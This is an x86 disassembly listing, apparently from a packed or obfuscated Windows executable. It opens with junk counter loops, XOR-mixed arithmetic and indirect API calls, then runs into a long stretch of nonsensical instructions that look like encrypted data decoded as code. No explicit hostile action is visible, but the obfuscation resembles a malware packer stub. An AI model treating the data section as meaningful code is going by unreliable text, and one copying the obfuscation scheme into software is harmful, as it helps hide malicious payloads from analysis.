  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x42fa24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x42fa28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0xe1d57a6a
  4125d0:	je     0x41258a
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	inc    ebp
  4125db:	push   ss
  4125dc:	add    bh,BYTE PTR [edi+0x55]
  4125df:	cli    
  4125e0:	jo     0x4125f9
  4125e2:	mov    dh,0x72
  4125e4:	and    ecx,DWORD PTR [ecx+0x38]
  4125e7:	out    dx,eax
  4125e8:	or     edi,DWORD PTR ds:0x22f96a99
  4125ee:	jbe    0x41257e
  4125f0:	inc    edx
  4125f1:	cdq    
  4125f2:	mov    edx,0x953308d4
  4125f7:	add    ecx,ebx
  4125f9:	loope  0x4125f7
  4125fb:	jne    0x412675
  4125fd:	sbb    DWORD PTR [ebx],edx
  4125ff:	mov    esp,0xb7311f5
  412604:	in     eax,0x51
  412606:	stos   DWORD PTR es:[edi],eax
  412607:	xlat   BYTE PTR ds:[ebx]
  412608:	aam    0xe2
  41260a:	push   esi
  41260b:	or     edx,ebp
  41260d:	pop    esi
  41260e:	jbe    0x412646
  412610:	or     DWORD PTR [eax+0x26],0x347a3981
  412617:	in     al,0x92
  412619:	(bad)  
  41261a:	rol    ah,1
  41261c:	pop    ecx
  41261d:	dec    esp
  41261e:	inc    edx
  41261f:	outs   dx,DWORD PTR ds:[esi]
  412620:	sbb    al,0xb2
  412622:	sti    
  412623:	xchg   ebx,eax
  412624:	ja     0x41265b
  412626:	cmp    DWORD PTR [ebx],edx
  412628:	retf   
  412629:	cmp    BYTE PTR [ebp-0x2947b8ee],al
  41262f:	inc    ebp
  412630:	mov    DWORD PTR ds:0xc9011550,esi
  412636:	mov    ch,0xd0
  412638:	scas   eax,DWORD PTR es:[edi]
  412639:	(bad)  
  41263a:	jne    0x4125d7
  41263c:	jle    0x41264d
  41263e:	call   0xadc7b678
  412643:	fmul   QWORD PTR [esi-0x7d1171f]
  412649:	lods   al,BYTE PTR ds:[esi]
  41264a:	ret    0x3453
  41264d:	shl    DWORD PTR [ebx+ebx*8],cl
  412650:	sar    DWORD PTR [edx],0x92
  412653:	loopne 0x41260f
  412655:	jb     0x4125f9
  412657:	ret    
  412658:	pusha  
  412659:	inc    edx
  41265a:	xor    ax,0xa184
  41265e:	pop    edx
  41265f:	fucomp st(6)
  412661:	xlat   BYTE PTR ds:[ebx]
  412662:	jle    0x4126c5
  412664:	pop    esp
  412665:	jo     0x412630
  412667:	mov    ah,0x54
  412669:	jnp    0x412621
  41266b:	sub    ah,BYTE PTR [ebx]
  41266d:	or     edi,DWORD PTR [edx-0xe1ea801]
  412673:	into   
  412674:	or     BYTE PTR [ecx-0x5a],cl
  412677:	aam    0x91
  412679:	lock push cs
  41267b:	pop    ecx
  41267c:	dec    edi
  41267d:	pusha  
  41267e:	and    eax,DWORD PTR [ecx+eiz*4+0x35a9223]
  412685:	in     al,0x24
  412687:	pop    ebx
  412688:	loop   0x4126b4
  41268a:	stos   DWORD PTR es:[edi],eax
  41268b:	adc    ch,BYTE PTR [edi-0x76]
  41268e:	out    dx,eax
  41268f:	xchg   ebp,eax
  412690:	and    ebp,DWORD PTR [esi+0x5dc3586f]
  412696:	mov    ebx,0x4ff0d331
  41269b:	adc    al,ah
  41269d:	fdiv   DWORD PTR [ecx]
  41269f:	mov    DWORD PTR [edi+0x400f0049],ebp
  4126a5:	repnz add DWORD PTR [ecx+0x21],ecx
  4126a9:	shr    al,0xdc
  4126ac:	test   al,0x12
  4126ae:	mov    al,ds:0x4e43c3d2
  4126b3:	cmp    eax,0xad8f48a9
  4126b8:	test   edi,ecx
  4126ba:	pop    ss
  4126bb:	mov    dl,ch
  4126bd:	fldcw  WORD PTR [ecx+0x1e6ffa05]
  4126c3:	sbb    eax,0xeab0ddcc
  4126c8:	push   0x46
  4126ca:	or     BYTE PTR [esi-0x2d2b3f13],dl
  4126d0:	dec    ecx
  4126d1:	imul   ecx,DWORD PTR ss:0x3835b040,0xd
  4126d9:	imul   edi,DWORD PTR [ebx+ebx*1-0x5e56dd71],0x6c
  4126e1:	push   ebp
  4126e2:	lock or al,0x51
  4126e5:	clc    
  4126e6:	popa   
  4126e7:	inc    edx
  4126e8:	test   al,0xd8
  4126ea:	in     eax,0xc8
  4126ec:	es ds loope 0x4126e5
  4126f0:	pop    esp
  4126f1:	add    BYTE PTR [edi],ah
  4126f3:	jmp    0x412724
  4126f5:	pop    eax
  4126f6:	dec    esp
  4126f7:	ss push ebp
  4126f9:	inc    esp
  4126fa:	fcomp  DWORD PTR [esi-0x6c6cc1bb]
  412700:	dec    edx
  412701:	sub    eax,0x466aa2d6
  412706:	mov    DWORD PTR [eax+ecx*8-0x5792af5c],esi
  41270d:	test   DWORD PTR [edx-0x3082181c],esp
  412713:	stc    
  412714:	ret    0x98c7
  412717:	fild   QWORD PTR [esi+0x550aa5d0]
  41271d:	iret   
  41271e:	(bad)  
  41271f:	fist   DWORD PTR [edi+edi*1-0x59dad01b]
  412726:	imul   edx,DWORD PTR ds:0x5ec20d6d,0x1
  41272d:	sbb    esp,edi
  41272f:	mov    DWORD PTR [edx+0x67],ebx
  412732:	scas   al,BYTE PTR es:[edi]
  412733:	xor    dl,ah
  412735:	pop    ebx
  412736:	pop    edi
  412737:	sub    DWORD PTR [esi+0x32],ebp
  41273a:	int3   
  41273b:	dec    ebp
  41273c:	stos   BYTE PTR es:[edi],al
  41273d:	aas    
  41273e:	add    DWORD PTR [eax],0x48
  412741:	aam    0xac
  412743:	add    BYTE PTR [edx],dl
  412745:	xchg   ecx,eax
  412746:	iret   
  412747:	adc    al,0xaf
  412749:	aam    0x91
  41274b:	scas   eax,DWORD PTR es:[edi]
  41274c:	int3   
  41274d:	test   al,0xd0
  41274f:	adc    al,0x4e
  412751:	adc    edx,DWORD PTR [edx]
  412753:	or     BYTE PTR ds:0x74383022,dl
  412759:	mov    bl,0x57
  41275b:	sbb    DWORD PTR [ebp-0x42],0xb892f32f
  412762:	adc    esi,ebp
  412764:	cmp    al,0x3a
  412766:	pop    ds
  412767:	out    0x75,eax
  412769:	jecxz  0x41274d
  41276b:	lock fist WORD PTR [edi+0x51e6e007]
  412772:	mov    edx,0x87a26c92
  412777:	out    dx,eax
  412778:	sub    esi,edi
  41277a:	sub    dh,ah
  41277c:	sbb    esi,DWORD PTR [edi-0x247b741d]
  412782:	xor    al,0x41
  412784:	pop    eax
  412785:	dec    ebx
  412786:	or     ecx,0xffffffd7
  412789:	aad    0x61
  41278b:	mov    ebx,0x67f6a797
  412790:	pop    edx
  412791:	jge    0x4127b1
  412793:	out    dx,al
  412794:	mov    ds:0xc01e9954,eax
  412799:	xlat   BYTE PTR ds:[ebx]
  41279a:	or     al,0x77
  41279c:	sbb    BYTE PTR [esi],cl
  41279e:	mov    al,0x2e
  4127a0:	sahf   
  4127a1:	inc    DWORD PTR [eax+0x24]
  4127a4:	adc    al,0xf6
  4127a6:	mov    eax,0x26291e44
  4127ab:	pop    ds
  4127ac:	stos   DWORD PTR es:[edi],eax
  4127ad:	jg     0x412813
  4127af:	hlt    
  4127b0:	jg     0x41280c
  4127b2:	cdq    
  4127b3:	les    edi,FWORD PTR [ecx+0x3a]
  4127b6:	xor    edx,DWORD PTR [edi-0x3a]
  4127b9:	pushf  
  4127ba:	xchg   ebp,eax
  4127bb:	mov    bl,0xf7
  4127bd:	fldenv [ebx+0x29]
  4127c0:	(bad)  
  4127c1:	ficom  WORD PTR [eiz*1+0x5853bcc]
  4127c8:	push   esi
  4127c9:	test   BYTE PTR [eax],al
  4127cb:	out    0x4,eax
  4127cd:	call   0xbb13:0x745091
  4127d4:	pop    ebx
  4127d5:	scas   al,BYTE PTR es:[edi]
  4127d6:	mov    dl,0xcf
  4127d8:	nop
  4127d9:	inc    esp
  4127da:	mov    edi,0xf9c27288
  4127df:	pusha  
  4127e0:	lock sar DWORD PTR [ebx+ebx*1+0x51],1
  4127e5:	or     bl,BYTE PTR [ecx-0x6319e78c]
  4127eb:	sub    esp,ecx
  4127ed:	mov    eax,0x4fa53525
  4127f2:	adc    eax,0xfb9e5125
  4127f7:	sub    eax,0xfb10e732
  4127fc:	push   esp
  4127fd:	mov    ebx,0x1f42ae27
  412802:	lods   eax,DWORD PTR ds:[esi]
  412803:	adc    al,0xf6
  412805:	inc    esp
  412806:	sub    al,0x27
  412808:	out    dx,eax
  412809:	inc    BYTE PTR [esi-0x6ecdbbc0]
  41280f:	aad    0x12
  412811:	pushf  
  412812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412813:	ror    DWORD PTR [esi+0x566c9f8c],0xfe
  41281a:	call   0x5640eb07
  41281f:	pop    esi
  412820:	mov    al,bh
  412822:	rcl    ch,1
  412824:	add    BYTE PTR [esi-0x7e],dh
  412827:	int3   
  412828:	stos   DWORD PTR es:[edi],eax
  412829:	fiadd  WORD PTR [ebx-0x6e]
  41282c:	push   0x45af4005
  412831:	xchg   ecx,eax
  412832:	xchg   BYTE PTR [eax-0x2edbffc4],ah
  412838:	lea    esi,[ebp+0x1c5d4249]
  41283e:	arpl   WORD PTR [esi],si
  412840:	lea    ecx,[eax]
  412842:	inc    eax
  412843:	adc    ebp,DWORD PTR ds:0x165eaa54
  412849:	pushf  
  41284a:	cmp    edx,0x19999184
  412850:	adc    eax,0x2967be7a
  412855:	dec    ebx
  412856:	ficomp DWORD PTR [ecx]
  412858:	sti    
  412859:	(bad)  
  41285a:	sti    
  41285b:	and    esi,esp
  41285d:	jb     0x412849
  41285f:	dec    edx
  412860:	cs (bad) 
  412862:	addr16 inc esi
  412864:	loopne 0x412857
  412866:	outs   dx,DWORD PTR ds:[esi]
  412867:	cmp    ebp,DWORD PTR [ecx]
  412869:	add    BYTE PTR [edi+0x3],0x20
  41286d:	pop    esp
  41286e:	arpl   WORD PTR [edi-0x41],bp
  412871:	stc    
  412872:	or     BYTE PTR [esi-0x2dd676e6],al
  412878:	ret    
  412879:	ret    0x1f90
  41287c:	lods   al,BYTE PTR ds:[esi]
  41287d:	xor    ecx,esp
  41287f:	nop
  412880:	out    0xf6,al
  412882:	push   ecx
  412883:	repnz mov ecx,0x63e17b72
  412889:	mov    ecx,0x6abda323
  41288e:	scas   al,BYTE PTR es:[edi]
  41288f:	pop    ebx
  412890:	push   es
  412891:	ja     0x41288f
  412893:	mov    ebx,0xc9d76da0
  412898:	pop    eax
  412899:	loop   0x4128e7
  41289b:	pop    ss
  41289c:	jg     0x412866
  41289e:	cmp    bh,BYTE PTR [esi+ebx*4-0x32]
  4128a2:	adc    BYTE PTR [ebx+0x64],bh
  4128a5:	adc    dh,BYTE PTR [esi+0x3ad4aba2]
  4128ab:	sbb    bh,BYTE PTR [esp+esi*1+0x4]
  4128af:	push   esp
  4128b0:	inc    edx
  4128b1:	das    
  4128b2:	(bad)  
  4128b3:	stos   BYTE PTR es:[edi],al
  4128b4:	jne    0x41285c
  4128b6:	mov    eax,0x5be1d004
  4128bb:	push   ebp
  4128bc:	sbb    DWORD PTR [edx+0x1451df0f],esp
  4128c2:	fcom   QWORD PTR [esi-0x3329853b]
  4128c8:	add    edi,DWORD PTR [edx+edi*1-0x36]
  4128cc:	lods   al,BYTE PTR ds:[esi]
  4128cd:	ds loop 0x4128dd
  4128d0:	(bad)  
  4128d1:	mov    ecx,0x6ee18701
  4128d6:	test   DWORD PTR [edi],ebx
  4128d8:	push   es
  4128d9:	sub    DWORD PTR gs:[ebp+0x6f],0x2b
  4128de:	icebp  
  4128df:	cli    
  4128e0:	cmp    ebp,edx
  4128e2:	ss push es
  4128e4:	pusha  
  4128e5:	or     al,0x70
  4128e7:	add    BYTE PTR [esi],al
  4128e9:	add    eax,0x9dcfe19
  4128ee:	(bad)  
  4128ef:	in     al,dx
  4128f0:	inc    ecx
  4128f1:	repz pop edi
  4128f3:	push   ebp
  4128f4:	loop   0x412966
  4128f6:	xor    DWORD PTR [esi],ecx
  4128f8:	das    
  4128f9:	and    DWORD PTR [eax],ebx
  4128fb:	xchg   esp,eax
  4128fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fd:	sub    BYTE PTR [esi-0x2],0x7a
  412901:	adc    BYTE PTR [edx-0x63265ccb],0x3a
  412908:	stos   BYTE PTR es:[edi],al
  412909:	dec    ebp
  41290a:	or     BYTE PTR [edi],0x31
  41290d:	cmp    eax,DWORD PTR [ebx+esi*4-0xa]
  412911:	icebp  
  412912:	xor    ax,0x601
  412916:	xor    eax,0xefd86452
  41291b:	add    BYTE PTR [ebp-0x31],bh
  41291e:	jp     0x412960
  412920:	pop    es
  412921:	add    bh,BYTE PTR [ebx]
  412923:	or     bh,dl
  412925:	add    BYTE PTR [eax],0x38
  412928:	adc    al,0x83
  41292a:	push   ebx
  41292b:	dec    esi
  41292c:	aad    0xbc
  41292e:	sar    BYTE PTR [edx],1
  412930:	or     ah,dl
  412932:	jae    0x4129a1
  412934:	mov    ecx,ebx
  412936:	rcl    ch,1
  412938:	mov    ds:0xfdb2dcfe,al
  41293d:	xchg   ebp,eax
  41293e:	inc    esi
  41293f:	mov    al,0x84
  412941:	lea    ebp,[edx]
  412943:	xchg   ecx,eax
  412944:	ror    cl,1
  412946:	or     cl,dl
  412948:	mov    eax,0xd864866c
  41294d:	lahf   
  41294e:	pusha  
  41294f:	pop    es
  412950:	jmp    0x1f2d709
  412955:	push   cs
  412956:	push   esp
  412957:	shl    DWORD PTR [eax-0x748da91d],0xf3
  41295e:	nop
  41295f:	jo     0x4129c0
  412961:	sub    ebp,DWORD PTR [edi]
  412963:	sbb    DWORD PTR [edx],eax
  412965:	rcl    DWORD PTR [esi-0x1f],1
  412968:	out    0x5f,al
  41296a:	int    0x8d
  41296c:	sbb    eax,0xd497d9db
  412971:	addr16 inc ebx
  412973:	aaa    
  412974:	xor    DWORD PTR [eax+0x1],eax
  412977:	jbe    0x4128fd
  412979:	xlat   BYTE PTR ds:[ebx]
  41297a:	mov    ds:0x1ef0e3ff,al
  41297f:	cmp    esp,DWORD PTR [edx]
  412981:	mov    esp,0x1f4d2910
  412986:	in     eax,dx
  412987:	cmp    bh,BYTE PTR [edi]
  412989:	fimul  WORD PTR [ebx]
  41298b:	xchg   BYTE PTR ss:[esi+0x7],ch
  41298f:	jno    0x412968
  412991:	lods   eax,DWORD PTR ds:[esi]
  412992:	fist   DWORD PTR [eax]
  412994:	jle    0x41294d
  412996:	jp     0x41298d
  412998:	(bad)  
  412999:	mov    ds:0xa18a08ed,al
  41299e:	test   ch,dl
  4129a0:	mov    dl,BYTE PTR [ecx-0x66db9fc9]
  4129a6:	pop    ds
  4129a7:	mov    ebx,0xc94ebd39
  4129ac:	xchg   esp,eax
  4129ad:	imul   edx,DWORD PTR [ebx+eiz*2+0x56],0x10
  4129b2:	leave  
  4129b3:	retf   
  4129b4:	jmp    0xdca9:0x40f6839
  4129bb:	ja     0x41297d
  4129bd:	pop    ecx
  4129be:	lahf   
  4129bf:	imul   edx,DWORD PTR [esi-0x46],0x5bcf7647
  4129c6:	and    al,0xa1
  4129c8:	xlat   BYTE PTR ds:[ebx]
  4129c9:	and    eax,0x9d6ac873
  4129ce:	test   eax,0xcf01d3ee
  4129d3:	int    0x8e
  4129d5:	and    BYTE PTR [ebp+0xf],0xb2
  4129d9:	test   al,0x59
  4129db:	and    al,0x16
  4129dd:	xchg   BYTE PTR [ebx],al
  4129df:	in     eax,0x2d
  4129e1:	add    BYTE PTR [ecx],0x50
  4129e4:	test   DWORD PTR [edi],0x8c23a3d6
  4129ea:	popf   
  4129eb:	cmp    DWORD PTR [ebp+0x1c],0xffffffdc
  4129ef:	jg     0x4129e7
  4129f1:	retf   0x9218
  4129f4:	pop    ecx
  4129f5:	or     BYTE PTR [ebp-0x7d570de7],bh
  4129fb:	push   edi
  4129fc:	push   cs
  4129fd:	xchg   edi,eax
  4129fe:	sbb    eax,0xd98bb065
  412a03:	push   eax
  412a04:	in     al,0x60
  412a06:	inc    edx
  412a07:	add    DWORD PTR [ebx+0x6f71424f],esp
  412a0d:	loop   0x412a6c
  412a0f:	dec    eax
  412a10:	dec    edx
  412a11:	out    0xce,al
  412a13:	jae    0x412a83
  412a15:	adc    eax,0x1b5070e0
  412a1a:	int    0xb7
  412a1c:	dec    edx
  412a1d:	inc    edi
  412a1e:	mov    gs,WORD PTR [edx]
  412a20:	inc    eax
  412a21:	fiadd  DWORD PTR [ebx]
  412a23:	or     bh,BYTE PTR [edx+0x6d5266e8]
  412a29:	not    DWORD PTR [edx-0x21]
  412a2c:	(bad)  
  412a2d:	dec    edi
  412a2e:	push   eax
  412a2f:	jmp    DWORD PTR [edi-0x39]
  412a32:	cdq    
  412a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a34:	es jb  0x412ab2
  412a37:	sub    BYTE PTR [ebx],0x3b
  412a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3b:	repnz fmul QWORD PTR ss:[ecx-0x769817ee]
  412a43:	adc    dh,BYTE PTR [ebx+edi*2-0x19]
  412a47:	sub    BYTE PTR [edx+0x1e223843],ch
  412a4d:	fsubrp st(3),st
  412a4f:	stos   DWORD PTR es:[edi],eax
  412a50:	sub    BYTE PTR [eax+0x64],al
  412a53:	jmp    0xc20a1365
  412a58:	fisubr WORD PTR [ebx+edx*4-0x699a6acc]
  412a5f:	xor    al,0xbe
  412a61:	je     0x412a81
  412a63:	not    BYTE PTR [eax+0x5543350b]
  412a69:	lea    ecx,[ecx+esi*8+0x2b]
  412a6d:	out    dx,eax
  412a6e:	sbb    DWORD PTR [ebx+edi*1-0x395752d3],ecx
  412a75:	adc    al,0xae
  412a77:	mov    al,BYTE PTR [eax-0x3ced107b]
  412a7d:	sub    BYTE PTR [edi+ebx*8+0xd2fb030],al
  412a84:	adc    ch,cl
  412a86:	ror    BYTE PTR [ebx-0x51],0x96
  412a8a:	and    eax,0xcd0cd53c
  412a8f:	jmp    0xb882:0xb5a8966c
  412a96:	stc    
  412a97:	std    
  412a98:	rcl    DWORD PTR [edi-0x79],0x48
  412a9c:	cmp    DWORD PTR [edx+0x66fee39],eax
  412aa2:	sub    DWORD PTR [ecx+0x38fc99b1],ecx
  412aa8:	mov    DWORD PTR [esi+edi*4-0x79cc2b52],esi
  412aaf:	push   ebp
  412ab0:	(bad)  
  412ab1:	sbb    eax,0xf9ac0e81
  412ab6:	das    
  412ab7:	fwait
  412ab8:	popf   
  412ab9:	popf   
  412aba:	push   ebx
  412abb:	xchg   esi,eax
  412abc:	inc    ecx
  412abd:	fidiv  WORD PTR [ebx+eax*1]
  412ac0:	jle    0x412b15
  412ac2:	mov    DWORD PTR [ebp-0x78],esp
  412ac5:	xchg   edx,eax
  412ac6:	push   0xac1ac1b4
  412acb:	mov    es,WORD PTR ds:0xf509b104
  412ad1:	xor    eax,DWORD PTR [ebx+0x4c908e5c]
  412ad7:	sbb    BYTE PTR [ecx-0x32ca61c6],dh
  412add:	scas   eax,DWORD PTR es:[edi]
  412ade:	adc    eax,0x5ede1493
  412ae3:	sar    BYTE PTR [ebp+0x6c49329],cl
  412ae9:	std    
  412aea:	fistp  DWORD PTR [esi]
  412aec:	jle    0x412ab9
  412aee:	scas   al,BYTE PTR es:[edi]
  412aef:	pusha  
  412af0:	or     BYTE PTR [eax+0x2b9fc28e],dl
  412af6:	inc    ecx
  412af7:	sub    DWORD PTR [ecx+0x76],edi
  412afa:	aad    0x93
  412afc:	retf   0xabd1
  412aff:	sahf   
  412b00:	jo     0x412b41
  412b02:	add    DWORD PTR [edx-0x20],ecx
  412b05:	pop    ebx
  412b06:	mov    ch,BYTE PTR [edi-0x4ec165bf]
  412b0c:	xchg   ebp,eax
  412b0d:	fbstp  TBYTE PTR [ecx-0x32e906f5]
  412b13:	sbb    eax,DWORD PTR [ebx-0x5c73013b]
  412b19:	test   BYTE PTR [edi],bl
  412b1b:	push   ss
  412b1c:	cdq    
  412b1d:	xor    edx,0x31a7b0bc
  412b23:	jmp    FWORD PTR [eax]
  412b25:	retf   0xcc0
  412b28:	(bad)  
  412b29:	jl     0x412af7
  412b2b:	aad    0x74
  412b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b2e:	xchg   BYTE PTR [edi-0x764a73f5],al
  412b34:	outs   dx,BYTE PTR ds:[esi]
  412b35:	es jns 0x412b58
  412b38:	scas   al,BYTE PTR es:[edi]
  412b39:	mov    bh,0xbc
  412b3b:	push   ecx
  412b3c:	cdq    
  412b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b3e:	sbb    DWORD PTR [ecx],ebx
  412b40:	inc    ebx
  412b41:	inc    ebx
  412b42:	xchg   DWORD PTR [esi+0x14bd47e1],eax
  412b48:	add    eax,0xfc1de0a5
  412b4d:	aam    0x42
  412b4f:	adc    BYTE PTR [edx],dl
  412b51:	cmp    eax,eax
  412b53:	dec    edx
  412b54:	(bad)  
  412b55:	bswap  eax
  412b57:	mov    bl,0xf3
  412b59:	or     ah,BYTE PTR [ebx]
  412b5b:	pop    ebx
  412b5c:	repnz mov DWORD PTR gs:[ecx-0x44],eax
  412b61:	fiadd  WORD PTR ds:0x5c4cfefb
  412b67:	outs   dx,DWORD PTR ds:[esi]
  412b68:	in     al,0xda
  412b6a:	mov    ecx,0xab4d98de
  412b6f:	icebp  
  412b70:	addr16 mov esi,0x9ca848fd
  412b76:	inc    eax
  412b77:	xor    al,0xd7
  412b79:	retf   
  412b7a:	push   cs
  412b7b:	xchg   esp,eax
  412b7c:	sub    DWORD PTR [eax],edi
  412b7e:	xchg   ecx,eax
  412b7f:	mov    ss,WORD PTR [ebx+0x42]
  412b82:	imul   ebp,esp,0xffffff9b
  412b85:	ins    BYTE PTR es:[edi],dx
  412b86:	adc    eax,0x55d7eaf4
  412b8b:	mov    ds,edx
  412b8d:	js     0x412b88
  412b8f:	hlt    
  412b90:	mov    al,ds:0x50a303d8
  412b95:	gs fcmovb st,st(6)
  412b98:	std    
  412b99:	add    ch,0xeb
  412b9c:	jle    0x412b96
  412b9e:	sbb    DWORD PTR [eax+0x25],eax
  412ba1:	imul   ebx,DWORD PTR [eax],0xffffffca
  412ba4:	xor    eax,0xba3f9b8f
  412ba9:	mov    cl,0xa0
  412bab:	fsubr  QWORD PTR [edi]
  412bad:	out    0x6f,al
  412baf:	inc    esp
  412bb0:	popa   
  412bb1:	frstor ds:0x1586df21
  412bb7:	stos   DWORD PTR es:[edi],eax
  412bb8:	mov    al,0xdf
  412bba:	cs mov eax,0xaaab63e8
  412bc0:	jg     0x412b53
  412bc2:	mov    DWORD PTR [edx+ebx*8-0x98436fe],esp
  412bc9:	sub    al,0x79
  412bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bcc:	mov    edi,DWORD PTR [edx+0x3a]
  412bcf:	ds pushf 
  412bd1:	mov    esi,0x5a98f49b
  412bd6:	sbb    eax,0x2aaf6b12
  412bdb:	and    BYTE PTR [ebx+edi*8],bl
  412bde:	pop    ebx
  412bdf:	pop    ebp
  412be0:	jns    0x412c4c
  412be2:	std    
  412be3:	inc    edx
  412be4:	mov    al,0x75
  412be6:	mov    ah,0x96
  412be8:	out    dx,eax
  412be9:	and    DWORD PTR [edx],edx
  412beb:	ins    DWORD PTR es:[edi],dx
  412bec:	int    0x81
  412bee:	xchg   esi,eax
  412bef:	jmp    0x5327:0xf6ee9084
  412bf6:	les    ebx,FWORD PTR [esi-0x44d2c9b2]
  412bfc:	imul   edi,DWORD PTR [esi+0xbaf5c8d],0xe5d8c3d8
  412c06:	jnp    0x412c15
  412c08:	rol    DWORD PTR [edx+0x51a9e725],1
  412c0e:	aam    0x7e
  412c10:	cdq    
  412c11:	sbb    BYTE PTR [ebp+0x777c1ed5],ah
  412c17:	pop    esi
  412c18:	cmp    DWORD PTR [edi-0x12],ebp
  412c1b:	pop    ebp
  412c1c:	into   
  412c1d:	popf   
  412c1e:	mov    ecx,0x9508947d
  412c23:	stos   DWORD PTR es:[edi],eax
  412c24:	mov    bh,BYTE PTR [eax+0x665a5954]
  412c2a:	sbb    DWORD PTR [edx+0x71346f3b],eax
  412c30:	test   eax,0x93fcf369
  412c35:	(bad)  
  412c36:	push   ss
  412c37:	rcl    ah,cl
  412c39:	jbe    0x412bd5
  412c3b:	xor    BYTE PTR fs:[edx+0x629b4ab5],cl
  412c42:	xchg   ebx,eax
  412c43:	mov    WORD PTR ds:0x9a1ff3ea,gs
  412c49:	fldcw  WORD PTR [edi]
  412c4b:	adc    dh,BYTE PTR [edi+0x6563ea13]
  412c51:	clc    
  412c52:	jp     0x412c0b
  412c54:	jg     0x412c32
  412c56:	call   0x9f55d5e
  412c5b:	addr16 out 0x8a,al
  412c5e:	outs   dx,DWORD PTR ds:[esi]
  412c5f:	dec    esp
  412c60:	mov    bl,0x78
  412c62:	or     BYTE PTR [edi+0x2c],ah
  412c65:	neg    ebx
  412c67:	fistp  DWORD PTR [ebp+0x14]
  412c6a:	adc    al,0xaf
  412c6c:	and    BYTE PTR [ebp-0x38],0xbf
  412c70:	fs xchg esp,eax
  412c72:	fwait
